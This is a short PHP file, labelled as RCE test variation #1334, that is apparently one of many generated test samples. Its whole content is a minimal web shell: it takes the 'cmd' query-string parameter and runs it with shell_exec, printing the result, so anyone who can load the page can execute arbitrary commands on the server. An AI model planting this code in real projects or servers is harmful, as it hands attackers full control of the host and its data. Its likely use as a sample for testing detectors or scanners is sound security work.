<?php
// RCE test variation #1334
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>